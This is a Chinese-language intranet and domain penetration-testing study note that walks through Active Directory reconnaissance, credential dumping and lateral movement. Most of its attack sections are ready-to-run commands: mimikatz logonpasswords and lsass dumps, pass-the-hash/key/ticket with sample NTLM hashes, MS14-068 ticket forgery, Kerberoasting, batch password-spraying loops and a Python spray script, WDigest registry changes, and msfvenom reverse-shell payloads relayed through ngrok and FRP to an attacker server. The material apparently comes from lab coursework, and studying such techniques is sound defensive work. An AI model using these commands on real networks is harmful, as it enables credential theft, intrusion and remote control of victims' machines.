名词 DMZ 英文全名“Demilitarized Zone”，中文含义是“隔离区”，在安全领域的具体含义是“内外网防火墙之间的区域”。DMZ区是一个缓冲区，在DMZ区存放着一些公共服务器，比如论坛等。 一般我们攻击web都是DMZ中的服务器，我们如果要获取更加多的敏感信息，需要进一步进行内网攻击。因为一般敏感信息都做了隔离。 局域网/内网 局域网就是内部网，局域网内部的电脑共用与外部的物理连接 工作组 工作组（Work Group）是局域网中的一个概念。它是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。它是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。 相同组中的不同用户通过对方主机的用户名和密码可以查看对方共享的文件夹，默认共享的是Users目录。不同组的不同用户通过对方主机的用户名和密码也可以查看对方共享的文件夹。所以工作组并不存在真正的集中管理作用。工作组里的所有计算机都是对等的 , 也就是没有服务器和客户机之分的。 域 这是一个有安全边界计算机组合（一个域用户没办法访问另一个与用户的资源），域内资源统一由域控制器DC集中管理（通过组策略管理），用户名和密码都是放在域控制器去验证的。 域控DC 域控制器(Domain Controller，DC)是一台安装并运行Active Directory的服务器，它包含Active Directory数据库的可写副本，参与Active Directory复制并控制对网络资源的访问。控制器统一管理帐户数据库、所有的用户登录、资源访问认证及其管理任务。一个域可以有一个或多个域控制器，各域控制器间地位平等，管理员可以在任一台域控制器上更新域中的信息，更新的信息会自动传递到网络中的其他域控制器中。 活动目录AD（activity dictionary）与NTDS.dit数据库 活动目录AD是域环境中提供目录服务的组件。活动目录存储着有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息，所有的网络对象信息以一种结构化的数据存储方式来保存，使得管理员和用户能够轻松地查找和使用这些信息。目录服务是帮助用户快速准确从目录中查找到他所需要的信息的服务。安装有AD活动目录的服务器就是域控DC。 在活动目录中记录的信息，被分为两大部分，一部分保存在活动目录数据库文件NTDS.dit 中，另一部分保存在被复制的文件系统上。 域用户帐户以域数据库的形式保存在活动目录中，NTDS.dit是活动目录的数据库文件，该文件记录的信息有以下三张表： Schema 表 ：这个表中包含了所有可在活动目录创建的对象信息以及他们之间的相互关系。包括各种类型对象的可选及不可选的各种属性。这个表是活动目录数据库中最小的一个表，但是也是最基础的一个表。 Link 表 ：Link表包含所有属性的关联，包括活动目录中所有对象的属性的值。一个用户对象的所有属性的类型，包括每个属性的值及用户所属于的组等信息都属于这个表。这个表要大于Schema 表，但与Data 表相比要小。 Data 表：活动目录中用户，组，应用程序特殊数据和其他的数据全部保存在Data表中。这是活动目录中存储信息最多的一个表，大量的活动目录的资料实际上还是存储在这个表中。 Ntdsutil.exe ntdsutil.exe是域控制器自带的域数据库管理工具，从windows Server 2008 开始就默认自带了。因此我们可以通过ntdsutil.exe提取出域中所有的域用户信息。 域的架构 单域/域树… 技术与认证 IPC连接 IPC(Internet Process Connection)是共享&quot;命名管道&quot;的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。 操作 建立连接 12net use \\\\192.168.0.100\\ipc$ &quot;password&quot; /user:&quot;administrator&quot; # 工作组net use \\\\192.168.0.100\\ipc$&quot;password&quot; /user:domain\\username #域内 传输文件：假如我要传的文件是putty.exe，admin$表示C:\\WINDOWS\\目录 1copy putty.exe \\\\192.168.0.100\\admin$ 定时执行命令：（CMD）中间的19.45是时间 123456net time \\\\192.168.0.100 # 查看时间at \\\\192.168.0.100 19:45 putty.exe # at指令是win2012之前的schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\\add.bat /F #创建 adduser 任务，schtasks &gt;=Windows2012schtasks /run /s 192.168.3.32 /tn adduser /i #运行 adduser 任务schtasks /delete /s 192.168.3.21 /tn adduser /f#删除 adduser 任务 磁盘映射与文件操作： 12345net use Z: \\\\192.168.0.100\\c$ #映射对方的磁盘C到我们这Z盘dir \\xx.xx.xx.xx\\C$\\ # 查看文件列表net use \\xx.xx.xx.xx\\C$\\1.bat /del # 删除net view xx.xx.xx.xx # 查看对方共享 断开： 1net use \\\\192.168.0.100 /del 常见的错误代码 5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限 51：网络问题，Windows 无法找到网络路径 53：找不到网络路径，可能是 IP 地址错误、目标未开机、目标 Lanmanserver 服务未启动、有 防火墙等问题 67：找不到网络名，本地 Lanmanworkstation 服务未启动，目标删除 ipc$ 1219：提供的凭据和已存在的凭据集冲突，说明已建立 IPC$，需要先删除 1326：账号密码错误 1792：目标 NetLogon 服务未启动，连接域控常常会出现此情况 2242：用户密码过期，目标有账号策略，强制定期更改密码 失败连接的原因 目标系统不是 NT 或以上的操作系统 对方没有打开 IPC$共享 对方未开启 139、445 端口，或者被防火墙屏蔽 输出命令、输入账号密码有错误 LDAP连接 这个是基于LINUX的类似共享的机制（差不多是像win的域一样） LM&amp;NTLM——Win-hash加密算法 Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。 NTLM协议具有许多漏洞，可以被中间人攻击、哈希转储攻击、零日漏洞攻击与弱密码攻击等方式利用，虽然因为这些漏洞，许多大企业均采用其他更加安全的协议进行认证（如Kerberos、OAuth2.0等），但是很多小企业内网均还使用这种认证方式登录 WMI WMI可以描述为一组管理Windows系统的方法和功能。我们可以把它当作API来与Windows系统进行相互交流。WMI在渗透测试中的价值在于它不需要下载和安装， 因为WMI是Windows系统自带功能。而且整个运行过程都在计算机内存中发生，不会留下任何痕迹。这一点是其它渗透测试工具所不能相比的。 参考：https://www.cnblogs.com/-qing-/p/10661480.html Kerberos协议 具体工作方法，在域中，简要介绍一下： 客户机将明文密码进行 NTLM 哈希,然后和时间戳一起加密(使用krbtgt 密码 hash 作为密钥)，发送给 kdc（域控），kdc 对用户进行检测，成功之后创建 TGT(Ticket-Granting Ticket) 将 TGT 进行加密签名返回给客户机器，只有域用户 krbtgt 才能读 取 kerberos 中 TGT 数据 然后客户机将 TGT 发送给域控制器 KDC 请求 TGS（票证授权服务）票证，并且对 TGT 进行检测。 检测成功之后，将目标服务账户的 NTLM 以及 TGT 进行加密，将 加密后的结果返回给客户机。 黄金票据 仿造TGT票据可以获取任意Kerberos的访问权限，由KRBTGT NTLM Hash加密，同KDC交互但不同AS交互。 白银票据 仿造TGS票据只能访问指定的服务如CIFS，由服务账号NTLM Hash加密，不同KDC交互直接访问Server。 认知 Linux能否进行域渗透 Q：AD域控制器只在windows server系统能做吗？Linux可以？ A：linux上也有相应的活动目录的，不过要装LDAP环境，一般企很少会用LDAP来管理的，因为功能上不及域强大，而且用linux来管理的话要求技术人员门槛也比较高，个人认为Linux还是比较适合做服务器好一点。（就是说Linux上面的域环境需要环境支撑，而且功能没有windows上的域强大，所以大部分我们遇见的都是windows，这也是没有Linux的原因。当然，Linux这个操作系统也是可以加入域的，比如域内有Linux的操作系统，有Linux的服务器也行，只是很少） 局域网渗透技术与域渗透技术 不同的攻击技术手段适用面不同，这个我们要有所了解，比如arp欺骗适用于局域网，而不适用于域。 工作组和域的区别 工作组：地位平等，管理分散，没有集中管理。 域环境：地位不平等，管理集中，实现集中管理。 域环境也可以简单的理解为工作组的升级版，更好管理。 这里我们把域环境和工作组区分开来是因为他们的攻击手段不同，工作组中的攻击手法如DNS劫持、ARP欺骗在域环境下是没有作用的。有一些攻击手段需要一些条件，这些条件在域环境下没有，相应的攻击手段就会失效。 基本信息搜集 主机&amp;服务信息 1234systeminfo 详细信息net start 启动服务tasklist 进程列表schtasks 计划任务 探针域内主机角色及服务信息 利用开放端口服务及计算机名判断 核心业务机器： 1.高级管理人员，系统管理员，财务/人事、业务人员的个人计算机 2.产品管理系统服务器 3.办公系统服务器 4.财务应用系统服务器 5.核心产品源码服务器 6.数据库服务器 7.文件或者网盘服务器 8.电子邮件服务器 9.网络监控系统服务器 10.其他服务器（内部技术文档服务器，其他监控服务器） 网络信息 12345ipconfig /all 判断存在域-dnsnet view /domain 判断存在域net time /domain 判断主域netstat -ano 当前网络端口开放nslookup 域名 追踪来源地址 判断存在域 dns后缀 1ipconfig /all 不存在域，则没有东西 存在域 net view与net time查看域与主域 net view /domain是判断是否存在域 net time /domain是判断主域 域控IP反查 12nslookup &lt;域控制器全名&gt; ping &lt;域控制器全名&gt; 用户信息搜集 系统默认常见用户身份 Domain Admins：域管理员（默认对域控制器有完全控制权） Domain Computers：域内机器 Domain Controllers：域控制器 Domain Guest：域访客，权限低 Domain Users：域用户 Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权） 我们主要攻击Domain Admains和Enterprise Admains 大部分成员主机在 Domain Users 域用户里 相关用户搜集 whoami /all 用户权限 net config workstation 登录信息 net user 本地用户 net localgroup 本地用户组 net user /domain 获取域用户信息 net group /domain 获取域用户组信息 wmic useraccount get /all 涉及域用户详细信息 net group &quot;Domain Admins&quot; /domain 查询域管理员账户 net group &quot;Enterprise Admins&quot; /domain 查询管理员用户组 net group &quot;Domain Controllers&quot; /domain 查询域控制器 涉及域用户详细信息 1wmic useraccount get /all 凭据信息搜集 旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备，包括 计算机用户HASH 明文获取 mimikatz(win) 123456789log# 初始化privilege ::debug# 抓取内存中的凭证sekurlsa::logonpasswords# 导出凭证sekurlsa::tickets /export# 进行PTH传递sekurlsa::pth /user:Administrateur /domain:god.org/ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd 如果mimikatz被杀了，那么可以使用procdump把内存先dump下来，然后再下载到本地，在本地使用Mimikatz来解析！ 1234procdump -accepteula -ma lsass.exe lsass.dmp# mimikatzsekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full kivi（msf集成） mimipenguin(linux) 计算机各种协议服务口令获取 LaZagne(all) XenArmor(win) 这两个软件主要是通过自动化翻找以下内容，从而获取凭据。 1.站点源码备份文件，数据库备份文件等 2.各类数据库WEB管理入口，如PHPmyadmin 3.浏览器保存密码，浏览器cookies 4.其他用户会话，3389和ipc$连接记录，回收站内容 5.windows 保存的WIFI密码 6.网络内部的各种账号和密码，如：Email，VPN，FTP，OA等 Netsh WLAN show profiles Netsh WLAN show profile name=&quot;无线名称&quot; key=clear 探寻域控架构——存活主机探测 为后续横向思路做准备，针对应用，协议等各类攻击手法 nbtscan工具 1nbtscan 192.168.3.0/24 自带内部命令 1for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL=&quot; 工具 NiShang NiShang：利用Powershell，攻击者可以在无需接触磁盘的情况下执行命令等，它集成了框架、脚本和各种payload。 导入模块 nishang 1Import-Module .\\nishang.psm1 设置执行策略 1Set-ExecutionPolicy RemoteSigned 获取模块 nishang 的命令函数 1Get-Command -Module nishang 获取常规计算机信息 1Get-Information 端口扫描（查看目录对应文件有演示语法，其他同理） 1Invoke-PortScan -StartAddress 192.168.80.0 -EndAddress 192.168.80.100 -ResolveHost -ScanPort 其他功能：删除补丁，反弹 Shell，凭据获取等 Impacket Impacket工具包介绍：https://www.freebuf.com/sectool/175208.html impacket工具包下载，可下载exe版本： https://gitee.com/RichChigga/impacket-examples-windows https://github.com/SecureAuthCorp/impacket Ladon 国产Ladon内网杀器测试验收 信息收集-协议扫描-漏洞探针-传递攻击等 官网：http://k8gege.org/Ladon/ 具体用法请查看官网wiki，举例如下 12345678# 扫当前机器所处C段的存活主机，其它模块同理Ladon.exe 192.168.1.8/24 OnlinePC # 扫当前机器所处C段操作系统版本，其它模块同理Ladon.exe 192.168.1.8/24 OsScan # 扫当前机器所处C段的ssh端口，其它模块同理Ladon.exe 192.168.1.8/24 MysqlScan# 扫当前机器所处C段的永恒之蓝漏洞，其它模块同理Ladon 192.168.1.8/24 MS17010 其他——协议 NetBios——探信息 NetBios是网络基本输入输出系统，通过这个协议，可以得到局域网内的主机信息，在windows下可以使用nbtstat查看netbios信息：nbtstat -A &lt;ip&gt;。 向内网发送这个协议的数据包，可以得到局域网内机器的计算机名、工作组、MAC地址。 域横向【传递】 拿下一台主机后，通过本地信息西欧及用户凭证，如何进行横向渗透拿下更多主机？ 假设有： 当前机器名称：webserver.god.org，192.168.3.31 当前机器用户账户密码 本地管理员账号密码：.\\administrator:admin!@#45 当前机器域用户密码：god\\webadmin:admin!@#45 域：god.org 域控ip——192.168.3.21 Username : administrator Domain : god.org Password : Admin12345 域内其他用户ip 192.168.3.25 192.168.3.29 192.168.3.30 192.168.3.32 思路 得到webshell主机后，对主机的密码明文或者哈希进行抓取，具体参考：凭据信息搜集 对其他主机进行扫描，扩大攻击面：具体参考：探寻域控架构——存活主机探测 当获取到一些重要的明文密码/哈希值时，我们可以用这些值进行爆破/碰撞，发现使用相同密码的用户，然后进行哈希传递/明文密码等横向传递。有很多种方法，具体参考后面的章节。包括： 传递完成即找到碰撞的用户，那么可以在这些用户上再拿下凭证，添加到我们的库中，完成搜集，然后批量进行传递。 传递之后，整体上线CS，使用PTT进行权限维持（黄金票据和白银票据） 尝试建立ipc链接，如果成功，那么就可以保存，然后操作 如果有能横向的机子，通常使用的有：$ipc链接，将文件上传到别的机子，然后再操作。 域横向扫描——at&amp;schtasks定时任务&amp;明文传递 之前说道AT和SCHTASKS是在提权的时候。是利用系统缺陷，当我们使用定时任务执行命令的时候，使用的是system权限。但是这个是通过ipc的。 明文传递 建立 IPC 链接到目标主机：net use \\\\192.168.3.21\\ipc$ &quot;Admin12345&quot; /user:god.org\\administrator 拷贝要执行的命令脚本到目标主机：copy add.bat \\\\192.168.3.21\\c$ 查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本：at \\\\192.168.3.21 15:47 c:\\add.bat 删除 IPC 链接 当然里面的at指令可以替换成atexec，他是impacket上的工具，因为是第三方工具，易被查杀，需要做免杀。 操作：【它也可以进行哈希传递】 123atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot; # 哈希传递 批量检测 首先把前期搜集来的域内IP地址存在ips.txt中，然后把搜集来的明文密码存在pass.txt中，把哈希存在hash.txt中。然后将对应的语句弄成bat文件，在自己电脑运行即可。 12345678FOR /F %%i in (ips.txt) do net use \\%%i\\ipc$ &quot;admin!@#45&quot; /user:administrator #批量检测IP对应明文连接FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami#批量检测IP对应明文回显版FOR /F %%i in (pass.txt) do atexec.exe ./administrator:%%i@192.168.3.21 whoami #批量检测明文对应IP回显版FOR /F %%i in (hash.txt) do atexec.exe -hashes :%%i ./administrator@192.168.3.21 whoami #批量检测HASH对应IP回显版 然而，这个可以用python写成更加好的代码进行攻击！小迪提供的脚本： 12345678910111213141516171819import os, timeips = &#123;#...&#125;users = &#123;# ...&#125;passs = &#123;# ...&#125;for ip in ips: for user in users: for mima in passs: exec = &quot;net use \\\\\\\\&quot; + ip + &#x27;\\ipc$ &#x27; + mima + &#x27; /user:god\\\\&#x27; + user print(&#x27;---&gt;&#x27; + exec + &#x27;&lt;---&#x27;) os.system(exec) time.sleep(1) 然后使用pyinstaller编译一下成为exe即可，无论是明文还是哈希传递，都是适用的：（也不保证一定行哦） 12pip install pyinstallerpyinstaller -F fuck_neiwang_001.py #生成可执行EXE 我自己开发的脚本~暂时鸽了 域横向扫描——smb&amp;wmi&amp;哈希传递 Windows2012以上版本默认关闭wdigest，攻击者无法从内存中获取明文密码 Windows2012以下版本若安装KB2871997补丁，同样也会导致无法获取明文密码 针对以上情况，我们提供了4种方式解决此类问题 1.利用哈希hash传递(pth，ptk等)进行移动 2.利用其它服务协议(SMB,WMI等)进行哈希移动 3.利用注册表操作开启Wdigest Auth值进行获取 注册表操作开启Wdigest Auth值 1reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 4.利用工具或第三方平台(Hachcat)进行破解获取 在线hash解密 hash破解工具 SMB服务进行明文/Hash传递（psexec,smbexec） 利用SMB服务可以通过明文或hash传递来远程执行，条件445服务端口开放。 psexec（自带）： 在微软官方Pstools工具包中，但是官方Pstools中的psexec只能明文连接，无法采用hash连接。如果需要hash连接，可以使用impacket工具包中的psexec，但是impacket非官方自带，容易被杀。 Pstools官方工具包：https://docs.microsoft.com/en-us/sysinternals/downloads/pstools 第一种方法：IPC连接 先有ipc链接，psexec需要明文或hash传递 12net use \\\\192.168.3.32\\ipc$ &quot;admin!@#45&quot; /user :administratorpsexec \\\\192.168.3.32 -s cmd # 需要先有ipc链接 -s以System权限运行CMD 第二种方法：无需IPC连接 不用建立IPC直接提供明文账户密码（推荐） 1234psexec \\\\192.168.3.21 -u administrator -p Admin12345 -s cmdpsexec -hashes :$HASH$ ./administrator @10.1.2.3psexec -hashes :$HASH$ domain/administrator @10.1.2.3psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator @192.168.3.32 利用hash失败，微软官方Pstools工具包中的psexec无法采用hash连接，只能明文连接。 smbexec（impacket） 非官方自带-参考impacket工具包使用，操作简单，容易被杀，无需先建立ipc链接、 明文或hash传递 123456smbexec god/administrator:Admin12345@192.168.3.21smbexec ./administrator:admin!@#45@192.168.3.32smbexec -hashes :$HASH$ ./admin@192.168.3.21smbbexec -hashes :$HASH$ domain/admin@192.168.3.21smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 WMI服务进行明文/Hash传递（cscript,wmiexec,wmic） WMI (Windows Management Instrumentation) 是通过135端口进行利用，支持用户名明文或者hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。它也有自带的和impacket版本的工具。 wmic（自带） 明文传递 优点是自带工具，不用考虑免杀 缺点是无回显, 需要想方法读取结果。 12wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create &quot;cmd.exe /c ipconfig &gt;C:\\1.txt&quot;wmic /node:192.168.3.32 /user:administrator /password:admin!@#45 process call create &quot;cmd.exe /c ipconfig &gt;C:\\1.txt&quot; 那就输出到一个文件，然后进行读取完事。如果进行一些操作，回显并不重要，一系列操作不用回显其实也能做到。 cscript（自带） 下载链接 明文传递 有回显 1cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345 wmiexec（impacket） 明文或hash传递 有回显exe版本 缺点：易被杀 1234wmiexec ./administrator:admin!@#45@192.168.3.32 &quot;whoami&quot;wmiexec god/administrator:Admin12345@192.168.3.21 &quot;whoami&quot;wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 &quot;whoami&quot;wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot; 域横扫描——PTH&amp;PTK&amp;PTT（哈希票据传递） PTH PTH(pass the hash) 利用 LM 或 NTLM 的值进行的渗透测试。 PTH 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。 禁用NTLM认证的影响 如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可以攻击成功。 补丁 KB 2871997 的影响 对于 8.1/2012r2，安装补丁 kb2871997 的 Win 7/2008r2/8/2012 等，可以使用 AES keys 代替 NT hash 来实现 ptk 攻击。 如果没有打补丁，那么所有用户都可以连接，打了就只能用administrator连接，或者使用 PTK 连接（AES 256），参考：https://www.freebuf.com/column/220740.html 实践 123456789#域连接sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7#工作组连接（就是改了个workgroup）sekurlsa::pth /user:administrator /domain:workgroup/ntlm:518b98ad4178a53695dc997aa02d455c#在实战中，本地用户与域用户，都尝试连接一下sekurlsa::pth /user:boss /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7\\\\OWA2010CN-God.god.orgprivilege::debugsekurlsa::logonpasswords 当获取到域内一个主机的权限之后，可以使用mimikatz运行sekurlsa::logonPasswords命令获取其LM和NTLM。当收集到NTLM数据后，很有可能内网中有其他主机的NTLM值与我们收集到的一致。此时我们就可以使用NTLM进行内网横向渗透。运行以下命令，域横向移动PTH传递，攻击未打补丁下域内主机： 12sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7sekurlsa::pth/user:administrator /domain:workgroup/ntlm:518b98ad4178a53695dc997aa02d455c 弹出一个新的cmd框，只要弹出框，就说明这个域内主机与我们收集到的NTLM值相同。接下来我们就可以进行at schtasks 复制文件、执行文件等其他操作了。都是如同IPC的相关命令 12dir \\\\OWA2010CN-God.god.org\\c$dir \\\\192.168.3.21\\c$ PTK PTK(pass the key) 利用的 ekeys aes256 进行的渗透测试。使用mimikatz查看： 12sekurlsa::ekeys #获取aes256值sekurlsa::pth /user:mary /domain:god /aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b PTT提权 PTT(pass the ticket) 利用票据凭证 TGT 进行的渗透测试。 PTT 攻击的部分就不是简单的 NTLM 认证了，它是利用 Kerberos 协议进行攻击的，这里就介绍三种常见的攻击方法： MS14-068 Golden ticket SILVER ticket 简单来说就是将连接合法的票据注入到内存中实现连接。 MS14-068 基于漏洞，Golden ticket(黄金票据)，SILVER ticket(白银票据)。其中 Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术。暂时不讲。 MS14-068 造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是kb3011780。 总结：ptt 传递不需本地管理员权限，连接时主机名连接，基于漏洞，工具，本地票据 MS14-068 MS14-068 powershell 执行，能实现普通用户直接获取域控 system 权限 MS14-068下载：https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068 操作： 查看SID，为后面的伪造提供数据验证 12&gt; whoami /user S-1-5-21-1218902331-2157346161-1782232778-1124 清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造 12klist //查看当前机器凭证klist purge//清空当前机器中所有凭证 利用 ms14-068 生成 TGT 数据 12# ms14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码.\\MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#45 票据注入内存 123./mimikatz.exe kerberos::ptc TGT_mary@god.org.ccacheexit Kekeo工具 工具kekeo下载：https://github.com/gentilkiwi/kekeo/releases 操作： 生成票据 1kekeo &quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot; 导入票据 1kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi 查看凭证 klist &amp; 利用，类似于ms14-068 利用本地票据 因为当前主机肯定之前与其他主机连接过，所以本地应该生成了一些票据，我们可以导出这些票据，然后再导入票据，利用。该方法类似于cookie欺骗。 缺点：票据是有有效期的，一般为10小时，所以如果当前主机10h之内连接过域控的话，我们可以利用该票据，但是如果超过10h，就没法利用。 操作： 导出本地票据(需管理权限)到当前目录 1sekurlsa::tickets /export 导入票据 1kerberos::ptt xxxxxxxxxx.xxxx.kirbi 利用票据 域横向扫描——RDP传递：mimikatz RDP简介 除了之前讲到的使用IPC，WMI，SMB等协议进行连接外，获取到的铭文密码或HASH密文也可以通过RDP协议进行链接操作。 RDP是一个远程显示协议，为微软终端服务应用的程序。端口号为：3389。而与之对应的Linux上面叫ssh。 明文密码连接： 1234# windows:mstsc /console /v :192.168.3.21：3389 /admin# linux: rdesktop 192.168.3.21:3389 密文连接 windows Server需要开启 Restricted Admin mode， 在Windows 8.1和Windows Server 2012 R2中默认开启 如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持； 可以通过修改注册表开启HASH连接： 1REG ADD &quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f 开启后运行： 12345mstsc.exe /restrictedadminmimikatz.exeprivilege::debugsekurlsa::pth /user:administrator /domain :god /ntlm :ccef208c6485269c20db2cad21734fe7 &quot;/run:mstsc.exe /restrictedadmin&quot; 域横扫描——Kerberoast攻击和SPN服务 SPN扫描也称为”扫描Kerberos服务实例名称”。SPN扫描通过请求特定SPN类型的服务主体名称来查找服务。与网络端口扫描相比，SPN扫描的主要特点是不需要通过连接网络中的每个IP地址来检查服务端口(不会因为触发内网中的IPS、IDS等设备的规则而产生大量的警告日志)。因为SPN查询是Kerberos票据行为的一 部分，所以检测难度很大。 在活动目录中发现服务的最佳方法就是SPN扫描 Kerberoast攻击 黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证（使用的是SPN）。 DC在活动目录中查找SPN，并使用与SPN关联的服务账户加密票证（TGS），以便服务能够验证用户是否可以访问。这个请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务账户的NTLM密码哈希用于加密服务票证。这样我们收到这个TGS票据，就可以离线破解。 利用方法： 由于域内的任何用户都可以向域内的任何服务请求TGS，知道相关服务的SPN后，可以用SPN申请一张票据 ST(TGS Ticket)，如果Kerberos 协议设置票据为 RC4加密，则可通过爆破的方式得到服务对应用户的密码。 有什么用： 我们获得该服务器的密码（TGS）后，我们就可以自己去请求某个服务。随意anytime 所以一般可以有以下流程： 服务主体名称（SPN）发现 请求服务票据 导出服务票据 破解服务票据 重写服务票据&amp;RAM注入 kerberoast下载：https://github.com/nidem/kerberoast 更加详细的流程（包括扩大攻击面）：https://www.cnblogs.com/zpchcbd/p/11707776.html SPN探针 12setspn -q */*setspn -q */* | findstr &quot;MSSQL&quot; 请求票据 12345678910111213# 删除缓存票据klist purge# powershell请求Add-Type -AssemblyName System.IdentityModelNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;服务名&quot;New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/SqlServer.god.org:1433&quot;# mimikatz请求（与owershell请求，二者选其一即可）mimikatz.exe &quot;kerberos::ask /target:xxxx&quot;# 查看票据klist 导出票据 123# mimikatz.\\mimikatz.exe kerberos::list /export 破解票据 123# 破解工具tgsrepcrack.py python3环境运行python tgsrepcrack.py passwd.txt xxxx.kirbipython3 .\\tgsrepcrack.py .\\password.txt .\\1-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi 重写票据 1234python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512# 将生成的票据注入内存mimikatz.exe kerberos::ptt xxxx.kirbi 利用 1dir //xxx.xxx.xxx.xxx /c$ Cobalt Strike 具体看手册，还是得多用，这个必问 域横向【代理与隧道】 内网与外网 内网网段： 10.0.0.0/8 10.255.255.255/8 172.16.0.0/12 172.31.255.255/12 192.168.0.0/16 192.168.255.255/16 后面那个是子网掩码，A类是8，B类是12，C类是16。即递增为4 不同网段（子网不同）之间是不可能进行通信的，需要通过转发才能实现，这个转发可以是路由器进行转发。说到底路由器（网关）也是一个设备，这个设备布置了流量转发的功能。 正向连接与反向连接 正向连接 即：攻击者去连接受害者，此时：攻击者处于内网，受害者处于外网 反向连接 即：受害者去连接攻击者，此时：攻击者处于外网，受害者处于内网 也就是谁在外网，就让内网的去连他，因为外网不能直接连上内网，更因为，内网的地址可能是动态分配的，所以会改变。 代理与隧道技术 代理主要解决网络的连通性问题，还可以解决 内网有过滤 内网无法连接外网的问题 隧道主要解决流量分析工具、流量监控工具、防火墙等相关工具的过滤问题 代理 Ngrok https://ngrok.com/ https://www.ngrok.cc/ 先注册一个账号，然后选择一个免费的服务器（现在要付费认证，认证还要付费，绝了，不用了，拜拜），选择http流量转发，假设本地端口192.168.80.137:4444，即内网Kali，内网的win7执行后门后，经过服务器转发到我们的Kali。 启动Ngrok：./sunny clientid 隧道号 然后在本机生成一个http木马（流量端口为80)传入到受害主机并且触发，注意，改木马的地址为我们服务器的地址： 123456msfvenom -p windows/meterpreter/reverse_http lhost=xiaodisec.free.idcfengye.com lport=80 -f exe -o test.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_httpset lhost 192.168.80.137set lport 4444exploit 然后kali开启监听即可 123456msfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_httpset lhost 192.168.80.137set lport 4444exploit FRP（同样可以配合proxychain） FRP说明文档：https://gofrp.org/docs/examples/ Release v0.42.0 · fatedier/frp (github.com) 参考：https://www.anquanke.com/post/id/184855 Frp工具：开源免费，自行搭建，方便修改，成本低，使用多样化，防止隐私泄露。 服务端设置 服务器修改配置文件 frps.ini： 12[common]bind_port = 7000 启动服务端：./frps -c ./frps.ini 控制端设置 配置文件 frpc.ini： 12345678[common]server_addr = 你的云主机 ipserver_port = 7000 #frpc 工作端口，必须和上面 frps 保持一致[msf]type = tcplocal_ip = 127.0.0.1local_port = 5555 #转发给本机的 5555remote_port = 6000 #服务端用 6000 端口转发给本机 启动客户端：./frpc -c ./frpc.ini 后门生成、运行、反弹接受 与上面的方法一样的： 1msfvenom -p windows/meterpreter/reverse_tcp lhost=你的云主机ip lport=6000 -f exe -o frp.exe 然后配置监听即可 自己搭建的外网代理 在外网主机上传一个frps，而自己这里搭建一个frpc，这样所有特定流量都会转发到frps上，frpc设置的是127.0.0.1，设置端口，就OK了 三层穿透——ProxyChain+Socks4a+路由 拓扑图 我们的目标很明确，就是获取三个flag，分别在target1/2/3中。 参考： https://www.cnblogs.com/zhengna/p/15348419.html https://blog.csdn.net/qq_42383069/article/details/123576958 